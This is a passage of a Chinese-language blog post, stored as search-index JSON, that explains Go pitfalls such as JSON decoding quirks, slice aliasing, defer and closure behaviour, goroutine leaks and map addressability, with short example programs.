字段解码，则此选项很有用。 package main import ( \"encoding/json\" \"bytes\" \"fmt\" ) func main() { records := [][]byte{ []byte(`{\"status\": 200, \"tag\":\"one\"}`), []byte(`{\"status\":\"ok\", \"tag\":\"two\"}`), } for idx, record := range records { var result struct { StatusCode uint64 StatusName string Status json.RawMessage `json:\"status\"` Tag string `json:\"tag\"` } if err := json.NewDecoder(bytes.NewReader(record)).Decode(\u0026result); err != nil { fmt.Println(\"error:\", err) return } var sstatus string if err := json.Unmarshal(result.Status, \u0026sstatus); err == nil { result.StatusName = sstatus } var nstatus uint64 if err := json.Unmarshal(result.Status, \u0026nstatus); err == nil { result.StatusCode = nstatus } fmt.Printf(\"[%v] result =\u003e %+v\\n\",idx,result) } } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:41:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"41.十六进制或其他非 UTF8 转义序列无法使用 JSON 字符串值 等级：中级 Go 期望字符串值是 UTF8 编码的。这意味着您的 JSON 字符串中不能有任意十六进制转义的二进制数据（并且您还必须转义反斜杠字符）。这确实是 Go 继承的 JSON 陷阱，但它在 Go 应用程序中经常发生，因此无论如何都要提及它。 package main import ( \"fmt\" \"encoding/json\" ) type config struct { Data string `json:\"data\"` } func main() { raw := []byte(`{\"data\":\"\\xc2\"}`) var decoded config if err := json.Unmarshal(raw, \u0026decoded); err != nil { fmt.Println(err) //prints: invalid character 'x' in string escape code } } 如果 Go 看到一个十六进制转义序列，Unmarshal/Decode 调用将失败。如果您确实需要在字符串中使用反斜杠，请确保使用另一个反斜杠对其进行转义。如果您想使用十六进制编码的二进制数据，您可以转义反斜杠，然后使用 JSON 字符串中的解码数据进行自己的十六进制转义。 package main import ( \"fmt\" \"encoding/json\" ) type config struct { Data string `json:\"data\"` } func main() { raw := []byte(`{\"data\":\"\\\\xc2\"}`) var decoded config json.Unmarshal(raw, \u0026decoded) fmt.Printf(\"%#v\",decoded) //prints: main.config{Data:\"\\\\xc2\"} //todo: do your own hex escape decoding for decoded.Data } 另一种选择是在 JSON 对象中使用字节数组/切片数据类型，但二进制数据必须采用 base64 编码。 package main import ( \"fmt\" \"encoding/json\" ) type config struct { Data []byte `json:\"data\"` } func main() { raw := []byte(`{\"data\":\"wg==\"}`) var decoded config if err := json.Unmarshal(raw, \u0026decoded); err != nil { fmt.Println(err) } fmt.Printf(\"%#v\",decoded) //prints: main.config{Data:[]uint8{0xc2}} } 其他需要注意的是 Unicode 替换字符 (U+FFFD)。Go 将使用替换字符而不是无效的 UTF8，因此 Unmarshal/Decode 调用不会失败，但你得到的字符串值可能不是你所期望的。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:42:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"42.比较结构、数组、切片和映射 等级：中级 ==如果每个结构字段都可以与相等运算符进行比较，则可以使用相等运算符 ,来比较结构变量。 package main import \"fmt\" type data struct { num int fp float32 complex complex64 str string char rune yes bool events \u003c-chan string handler interface{} ref *byte raw [10]byte } func main() { v1 := data{} v2 := data{} fmt.Println(\"v1 == v2:\",v1 == v2) //prints: v1 == v2: true } 如果任何结构字段不可比较，则使用相等运算符将导致编译时错误。请注意，只有当它们的数据项具有可比性时，数组才具有可比性。 package main import \"fmt\" type data struct { num int //ok checks [10]func() bool //not comparable doit func() bool //not comparable m map[string] string //not comparable bytes []byte //not comparable } func main() { v1 := data{} v2 := data{} fmt.Println(\"v1 == v2:\",v1 == v2) } Go 确实提供了许多辅助函数来比较无法使用比较运算符进行比较的变量。 最通用的解决方案是使用DeepEqual()反射包中的函数。 package main import ( \"fmt\" \"reflect\" ) type data struct { num int //ok checks [10]func() bool //not comparable doit func() bool //not comparable m map[string] string //not comparable bytes []byte //not comparable } func main() { v1 := data{} v2 := data{} fmt.Println(\"v1 == v2:\",reflect.DeepEqual(v1,v2)) //prints: v1 == v2: true m1 := map[string]string{\"one\": \"a\",\"two\": \"b\"} m2 := map[string]string{\"two\": \"b\", \"one\": \"a\"} fmt.Println(\"m1 == m2:\",reflect.DeepEqual(m1, m2)) //prints: m1 == m2: true s1 := []int{1, 2, 3} s2 := []int{1, 2, 3} fmt.Println(\"s1 == s2:\",reflect.DeepEqual(s1, s2)) //prints: s1 == s2: true } 除了速度很慢（这可能会或可能不会对您的应用程序造成破坏）之外，DeepEqual()它也有自己的问题。 package main import ( \"fmt\" \"reflect\" ) func main() { var b1 []byte = nil b2 := []byte{} fmt.Println(\"b1 == b2:\",reflect.DeepEqual(b1, b2)) //prints: b1 == b2: false } DeepEqual()不认为空切片等于“nil”切片。此行为与您使用该bytes.Equal()函数获得的行为不同。bytes.Equal()认为“nil”和空切片是相等的。 package main import ( \"fmt\" \"bytes\" ) func main() { var b1 []byte = nil b2 := []byte{} fmt.Println(\"b1 == b2:\",bytes.Equal(b1, b2)) //prints: b1 == b2: true } DeepEqual()比较切片并不总是完美的。 package main import ( \"fmt\" \"reflect\" \"encoding/json\" ) func main() { var str string = \"one\" var in interface{} = \"one\" fmt.Println(\"str == in:\",str == in,reflect.DeepEqual(str, in)) //prints: str == in: true true v1 := []string{\"one\",\"two\"} v2 := []interface{}{\"one\",\"two\"} fmt.Println(\"v1 == v2:\",reflect.DeepEqual(v1, v2)) //prints: v1 == v2: false (not ok) data := map[string]interface{}{ \"code\": 200, \"value\": []string{\"one\",\"two\"}, } encoded, _ := json.Marshal(data) var decoded map[string]interface{} json.Unmarshal(encoded, \u0026decoded) fmt.Println(\"data == decoded:\",reflect.DeepEqual(data, decoded)) //prints: data == decoded: false (not ok) } 如果您的字节切片（或字符串）包含文本数据，当您需要以不区分大小写的方式（在使用 、 或 之前）比较值时，您可能想使用或来自“字节”和“字符串”ToUpper()包。它适用于英文文本，但不适用于许多其他语言的文本。并且应该被使用。ToLower()==bytes.Equal()bytes.Compare()strings.EqualFold()bytes.EqualFold() 如果您的字节切片包含需要针对用户提供的数据进行验证的机密（例如，加密哈希、令牌等），请不要使用reflect.DeepEqual(), bytes.Equal()，或者bytes.Compare()因为这些函数会使您的应用程序容易受到计时攻击。为避免泄漏计时信息，请使用“crypto/subtle”包中的函数（例如，subtle.ConstantTimeCompare()）。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:43:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"43.从 panic 中恢复（ recover ） 等级：中级 该recover()函数可用于捕获/拦截panic。调用 recover()只有在 defer 延迟函数中完成时才会起作用。 Incorrect: package main import \"fmt\" func main() { recover() //doesn't do anything panic(\"not good\") recover() //won't be executed :) fmt.Println(\"ok\") } Works: package main import \"fmt\" func main() { defer func() { fmt.Println(\"recovered:\",recover()) }() panic(\"not good\") } 调用recover()仅在您的延迟函数中直接调用时才有效。 Fails: package main import \"fmt\" func doRecover() { fmt.Println(\"recovered =\u003e\",recover()) //prints: recovered =\u003e \u003cnil\u003e } func main() { defer func() { doRecover() //panic is not recovered }() panic(\"not good\") } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:44:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"44.在切片、数组和映射“range”子句中更新和引用item值 等级：中级 “range”子句中生成的数据值是实际集合元素的副本。它们不是对原始item的引用。这意味着更新值不会更改原始数据。这也意味着获取值的地址不会为您提供指向原始数据的指针。 package main import \"fmt\" func main() { data := []int{1,2,3} for _,v := range data { v *= 10 //original item is not changed } fmt.Println(\"data:\",data) //prints data: [1 2 3] } 如果您需要更新原始集合记录值，请使用索引运算符来访问数据。 package main import \"fmt\" func main() { data := []int{1,2,3} for i,_ := range data { data[i] *= 10 } fmt.Println(\"data:\",data) //prints data: [10 20 30] } 如果您的集合包含指针值，则规则略有不同。如果您希望原始记录指向另一个值，您仍然需要使用索引运算符，但您可以使用“for range”子句中的第二个值更新存储在目标位置的数据。 package main import \"fmt\" func main() { data := []*struct{num int} {{1},{2},{3}} for _,v := range data { v.num *= 10 } fmt.Println(data[0],data[1],data[2]) //prints \u0026{10} \u0026{20} \u0026{30} } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:45:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"45.切片中的“隐藏”数据 等级：中级 重新切片切片时，新切片将引用原始切片的数组。如果您忘记了这种行为，如果您的应用程序分配大型临时切片从它们创建新切片以引用原始数据的小部分，则可能会导致意外的内存使用。 package main import \"fmt\" func get() []byte { raw := make([]byte,10000) fmt.Println(len(raw),cap(raw),\u0026raw[0]) //prints: 10000 10000 \u003cbyte_addr_x\u003e return raw[:3] } func main() { data := get() fmt.Println(len(data),cap(data),\u0026data[0]) //prints: 3 10000 \u003cbyte_addr_x\u003e } 为避免此陷阱，请确保从临时切片中复制所需的数据（而不是重新切片）。 package main import \"fmt\" func get() []byte { raw := make([]byte,10000) fmt.Println(len(raw),cap(raw),\u0026raw[0]) //prints: 10000 10000 \u003cbyte_addr_x\u003e res := make([]byte,3) copy(res,raw[:3]) return res } func main() { data := get() fmt.Println(len(data),cap(data),\u0026data[0]) //prints: 3 3 \u003cbyte_addr_y\u003e } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:46:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"46.切片数据覆盖 等级：中级 假设您需要重写路径（存储在切片中）。您重新切片路径以引用修改第一个文件夹名称的每个目录，然后组合名称以创建新路径。 package main import ( \"fmt\" \"bytes\" ) func main() { path := []byte(\"AAAA/BBBBBBBBB\") sepIndex := bytes.IndexByte(path,'/') dir1 := path[:sepIndex] dir2 := path[sepIndex+1:] fmt.Println(\"dir1 =\u003e\",string(dir1)) //prints: dir1 =\u003e AAAA fmt.Println(\"dir2 =\u003e\",string(dir2)) //prints: dir2 =\u003e BBBBBBBBB dir1 = append(dir1,\"suffix\"...) path = bytes.Join([][]byte{dir1,dir2},[]byte{'/'}) fmt.Println(\"dir1 =\u003e\",string(dir1)) //prints: dir1 =\u003e AAAAsuffix fmt.Println(\"dir2 =\u003e\",string(dir2)) //prints: dir2 =\u003e uffixBBBB (not ok) fmt.Println(\"new path =\u003e\",string(path)) } 它没有像你预期的那样工作。而不是“AAAAsuffix/BBBBBBBBB”，你最终得到的是“AAAAsuffix/uffixBBBB”。发生这种情况是因为两个目录切片都引用了原始路径切片中相同的底层数组数据。这意味着原始路径也被修改了。根据您的应用程序，这也可能是一个问题。 这个问题可以通过分配新切片和复制你需要的数据来解决。另一种选择是使用完整的切片表达式。 package main import ( \"fmt\" \"bytes\" ) func main() { path := []byte(\"AAAA/BBBBBBBBB\") sepIndex := bytes.IndexByte(path,'/') dir1 := path[:sepIndex:sepIndex] //full slice expression dir2 := path[sepIndex+1:] fmt.Println(\"dir1 =\u003e\",string(dir1)) //prints: dir1 =\u003e AAAA fmt.Println(\"dir2 =\u003e\",string(dir2)) //prints: dir2 =\u003e BBBBBBBBB dir1 = append(dir1,\"suffix\"...) path = bytes.Join([][]byte{dir1,dir2},[]byte{'/'}) fmt.Println(\"dir1 =\u003e\",string(dir1)) //prints: dir1 =\u003e AAAAsuffix fmt.Println(\"dir2 =\u003e\",string(dir2)) //prints: dir2 =\u003e BBBBBBBBB (ok now) fmt.Println(\"new path =\u003e\",string(path)) } 完整切片表达式中的额外参数控制新切片的容量。现在追加到该切片将触发新的缓冲区分配，而不是覆盖第二个切片中的数据。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:47:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"47.切片中的*“旧数据”* 等级：中级 多个切片可以引用相同的数据。例如，当您从现有切片创建新切片时，可能会发生这种情况。如果您的应用程序依赖此行为来正常运行，那么您需要担心“陈旧”切片。 在某些时候，当原始数组无法容纳更多新数据时，将数据添加到其中一个切片将导致新的数组分配。现在其他切片将指向旧数组（带有旧数据）。 import \"fmt\" func main() { s1 := []int{1,2,3} fmt.Println(len(s1),cap(s1),s1) //prints 3 3 [1 2 3] s2 := s1[1:] fmt.Println(len(s2),cap(s2),s2) //prints 2 2 [2 3] for i := range s2 { s2[i] += 20 } //still referencing the same array fmt.Println(s1) //prints [1 22 23] fmt.Println(s2) //prints [22 23] s2 = append(s2,4) for i := range s2 { s2[i] += 10 } //s1 is now \"stale\" fmt.Println(s1) //prints [1 22 23] fmt.Println(s2) //prints [32 33 14] } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:48:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"48.类型声明和方法 等级：中级 当您通过从现有（非接口）类型定义新类型来创建类型声明时，您不会继承为该现有类型定义的方法。 Fails: package main import \"sync\" type myMutex sync.Mutex func main() { var mtx myMutex mtx.Lock() //error mtx.Unlock() //error } Compile Errors: /tmp/sandbox106401185/main.go:9: mtx.Lock undefined (type myMutex has no field or method Lock) /tmp/sandbox106401185/main.go:10: mtx.Unlock undefined (type myMutex has no field or method Unlock) 如果您确实需要原始类型的方法，您可以定义一个新的结构类型，将原始类型嵌入为匿名字段。 Works: package main import \"sync\" type myLocker struct { sync.Mutex } func main() { var lock myLocker lock.Lock() //ok lock.Unlock() //ok } 接口类型声明也保留了它们的方法集。 Works: package main import \"sync\" type myLocker sync.Locker func main() { var lock myLocker = new(sync.Mutex) lock.Lock() //ok lock.Unlock() //ok } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:49:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"49. 从“for switch”和“for select”代码块中 break 等级：中级 没有标签的“break”语句只会让你脱离内部 switch/select 块。如果使用“return”语句不是一个选项，那么为外部循环定义一个标签是下一个最好的事情。 package main import \"fmt\" func main() { loop: for { switch { case true: fmt.Println(\"breaking out...\") break loop } } fmt.Println(\"out!\") } “goto”语句也可以解决问题…… ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:50:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"50.“for”语句中的迭代变量和闭包 等级：中级 这是 Go 中最常见的问题。for语句中的迭代变量在每次迭代中被重用。这意味着在for循环中创建的每个闭包（又名函数字面量）都将引用相同的变量（并且它们将在这些 goroutine 开始执行时获取该变量的值）。 Incorrect: package main import ( \"fmt\" \"time\" ) func main() { data := []string{\"one\",\"two\",\"three\"} for _,v := range data { go func() { fmt.Println(v) }() } time.Sleep(3 * time.Second) //goroutines print: three, three, three } 最简单的解决方案（不需要对goroutine进行任何修改），是将当前迭代变量值保存到for循环内的局部变量中 Works: package main import ( \"fmt\" \"time\" ) func main() { data := []string{\"one\",\"two\",\"three\"} for _,v := range data { vcopy := v // 循环体内局部变量 go func() { fmt.Println(vcopy) }() } time.Sleep(3 * time.Second) //goroutines print: one, two, three } 另一种解决方案是将当前迭代变量作为参数传递给匿名 goroutine。 Works: package main import ( \"fmt\" \"time\" ) func main() { data := []string{\"one\",\"two\",\"three\"} for _,v := range data { go func(in string) { fmt.Println(in) }(v) } time.Sleep(3 * time.Second) //goroutines print: one, two, three } 这是一个稍微复杂一点的陷阱版本。 Incorrect: package main import ( \"fmt\" \"time\" ) type field struct { name string } func (p *field) print() { fmt.Println(p.name) } func main() { data := []field{{\"one\"},{\"two\"},{\"three\"}} for _,v := range data { go v.print() } time.Sleep(3 * time.Second) //goroutines print: three, three, three } Works: package main import ( \"fmt\" \"time\" ) type field struct { name string } func (p *field) print() { fmt.Println(p.name) } func main() { data := []field{{\"one\"},{\"two\"},{\"three\"}} for _,v := range data { v := v go v.print() } time.Sleep(3 * time.Second) //goroutines print: one, two, three } 你认为当你运行这段代码时你会看到什么（为什么）？ package main import ( \"fmt\" \"time\" ) type field struct { name string } func (p *field) print() { fmt.Println(p.name) } func main() { data := []*field{{\"one\"},{\"two\"},{\"three\"}} for _,v := range data { go v.print() } time.Sleep(3 * time.Second) } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:51:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"51.延迟函数调用参数评估 等级：中级 延迟函数调用的参数是在评估defer语句时评估的（而不是在函数实际执行时）。当您推迟方法调用时，同样的规则也适用。结构值也与显式方法参数和封闭变量一起保存。 package main import \"fmt\" func main() { var i int = 1 defer fmt.Println(\"result =\u003e\",func() int { return i * 2 }()) i++ //prints: result =\u003e 2 (not ok if you expected 4) } 如果您有指针参数，则可以更改它们指向的值，因为在defer评估语句时只保存指针。 package main import ( \"fmt\" ) func main() { i := 1 defer func (in *int) { fmt.Println(\"result =\u003e\", *in) }(\u0026i) i = 2 //prints: result =\u003e 2 } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:52:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"52.延迟函数调用执行 等级：中级 延迟调用在包含函数的末尾执行（并且以相反的顺序），而不是在包含代码块的末尾。对于新的 Go 开发人员来说，将延迟代码执行规则与变量作用域规则混淆是一个容易犯的错误。如果你有一个长时间运行的函数，它有一个for循环尝试defer在每次迭代中清理资源调用，这可能会成为一个问题。 package main import ( \"fmt\" \"os\" \"path/filepath\" ) func main() { if len(os.Args) != 2 { os.Exit(-1) } start, err := os.Stat(os.Args[1]) if err != nil || !start.IsDir(){ os.Exit(-1) } var targets []string filepath.Walk(os.Args[1], func(fpath string, fi os.FileInfo, err error) error { if err != nil { return err } if !fi.Mode().IsRegular() { return nil } targets = append(targets,fpath) return nil }) for _,target := range targets { f, err := os.Open(target) if err != nil { fmt.Println(\"bad target:\",target,\"error:\",err) //prints error: too many open files break } defer f.Close() //will not be closed at the end of this code block //do something with the file... } } 解决问题的一种方法是将代码块包装在函数中。 package main import ( \"fmt\" \"os\" \"path/filepath\" ) func main() { if len(os.Args) != 2 { os.Exit(-1) } start, err := os.Stat(os.Args[1]) if err != nil || !start.IsDir(){ os.Exit(-1) } var targets []string filepath.Walk(os.Args[1], func(fpath string, fi os.FileInfo, err error) error { if err != nil { return err } if !fi.Mode().IsRegular() { return nil } targets = append(targets,fpath) return nil }) for _,target := range targets { func() { f, err := os.Open(target) if err != nil { fmt.Println(\"bad target:\",target,\"error:\",err) return } defer f.Close() //ok //do something with the file... }() } } 另一种选择是摆脱defer声明:-) ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:53:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"53.失败的类型断言 等级：中级 失败的类型断言返回断言语句中使用的目标类型的“零值”。当它与可变阴影混合时，这可能会导致意外行为。 Incorrect: package main import \"fmt\" func main() { var data interface{} = \"great\" if data, ok := data.(int); ok { fmt.Println(\"[is an int] value =\u003e\",data) } else { fmt.Println(\"[not an int] value =\u003e\",data) //prints: [not an int] value =\u003e 0 (not \"great\") } } Works: package main import \"fmt\" func main() { var data interface{} = \"great\" if res, ok := data.(int); ok { fmt.Println(\"[is an int] value =\u003e\",res) } else { fmt.Println(\"[not an int] value =\u003e\",data) //prints: [not an int] value =\u003e great (as expected) } } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:54:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"54.阻塞的 Goroutines 和资源泄漏 等级：中级 Rob Pike 在 2012 年 Google I/O 上的“Go Concurrency Patterns”演讲中谈到了一些基本的并发模式。从多个目标中获取第一个结果就是其中之一。 func First(query string, replicas ...Search) Result { c := make(chan Result) searchReplica := func(i int) { c \u003c- replicas[i](query) } for i := range replicas { go searchReplica(i) } return \u003c-c } 该函数为每个搜索副本启动一个 goroutine。每个 goroutine 将其搜索结果发送到结果通道。返回结果通道的第一个值。 其他 goroutine 的结果如何？goroutines 本身呢？ 函数中的结果通道First()是无缓冲的。这意味着只有第一个 goroutine 返回。所有其他 goroutine 都被困在试图发送它们的结果。这意味着如果您有多个副本，则每次调用都会泄漏资源。 为避免泄漏，您需要确保所有 goroutine 都退出。一种可能的解决方案是使用足够大的缓冲结果通道来保存所有结果。 func First(query string, replicas ...Search) Result { c := make(chan Result,len(replicas)) searchReplica := func(i int) { c \u003c- replicas[i](query) } for i := range replicas { go searchReplica(i) } return \u003c-c } 另一种可能的解决方案是使用select带有案例的语句default和可以保存一个值的缓冲结果通道。该default案例确保即使结果通道无法接收消息，goroutines 也不会卡住。 func First(query string, replicas ...Search) Result { c := make(chan Result,1) searchReplica := func(i int) { select { case c \u003c- replicas[i](query): default: } } for i := range replicas { go searchReplica(i) } return \u003c-c } 您还可以使用特殊的取消通道来中断worker。 func First(query string, replicas ...Search) Result { c := make(chan Result) done := make(chan struct{}) defer close(done) searchReplica := func(i int) { select { case c \u003c- replicas[i](query): case \u003c- done: } } for i := range replicas { go searchReplica(i) } return \u003c-c } 为什么演示文稿包含这些错误？Rob Pike 只是不想让幻灯片复杂化。这是有道理的，但对于新的 Go 开发人员来说，这可能是一个问题，他们会按原样使用代码而不考虑它可能有问题。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:55:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"55.不同零大小变量的相同地址 等级：中级 如果您有两个不同的变量，它们不应该有不同的地址吗？好吧，Go 不是这种情况 :-) 如果你有零大小的变量，它们可能在内存中共享完全相同的地址。 package main import ( \"fmt\" ) type data struct { } func main() { a := \u0026data{} b := \u0026data{} if a == b { fmt.Printf(\"same address - a=%p b=%p\\n\",a,b) //prints: same address - a=0x1953e4 b=0x1953e4 } } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:56:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"56.iota 的首次使用并不总是从零开始 等级：中级 看起来标识符iota就像一个增量运算符。你开始一个新的常量声明，第一次使用iota你得到零，第二次使用它你得到一个，依此类推。但情况并非总是如此。 package main import ( \"fmt\" ) const ( azero = iota aone = iota ) const ( info = \"processing\" bzero = iota bone = iota ) func main() { fmt.Println(azero,aone) //prints: 0 1 fmt.Println(bzero,bone) //prints: 1 2 } iota确实是常量声明块中当前行的索引运算符，因此如果第一次使用的不是iota常量声明块中的第一行，则初始值不会为零。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:57:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"57.在值实例上使用指针接收器方法 等级：高级 只要值是可寻址的，就可以对值调用指针接收器方法。换句话说，在某些情况下，您不需要该方法的值接收器版本。 不过，并非每个变量都是可寻址的。map元素不可寻址。通过接口引用的变量也是不可寻址的。 package main import \"fmt\" type data struct { name string } func (p *data) print() { fmt.Println(\"name:\",p.name) } type printer interface { print() } func main() { d1 := data{\"one\"} d1.print() //ok // var in printer = data{\"two\"} //error var in printer = \u0026data{\"two\"} //good in.print() m := map[string]data {\"x\":data{\"three\"}} m[\"x\"].print() //error } Compile Errors: /tmp/sandbox017696142/main.go:21: cannot use data literal (type data) as type printer in assignment: data does not implement printer (print method has pointer receiver) /tmp/sandbox017696142/main.go:25: cannot call pointer method on m[“x”] /tmp/sandbox017696142/main.go:25: cannot take the address of m[“x”] ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:58:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"58.更新 map 值字段 等级：高级 如果您有结构值映射，则无法更新单个结构字段。 Fails: package main type data struct { name string } func main() { m := map[string]data {\"x\":{\"one\"}} m[\"x\"].name = \"two\" //error } Compile Error: /tmp/sandbox380452744/main.go:9: cannot assign to m[“x”].name 它不起作用，因为map元素不可寻址。 说明：map 在内存中的存储结构与数组和指针不同，它是由哈希表实现的，每个键值对都有一个哈希值作为索引，用于快速查找数据。如果 map 可以寻址，那么它的哈希值就会发生变化，导致无法快速查找数据，从而破坏了 map 的内部结构。 而且，map 的大小是动态变化的，它可以根据添加或删除键值对来动态扩容或缩小。如果 map 可以寻址，那么它的内部结构就会发生变化，因此 Golang 的设计者禁止了 map 的寻址。 在 Golang 中，如果我们需要修改 map 或 slice 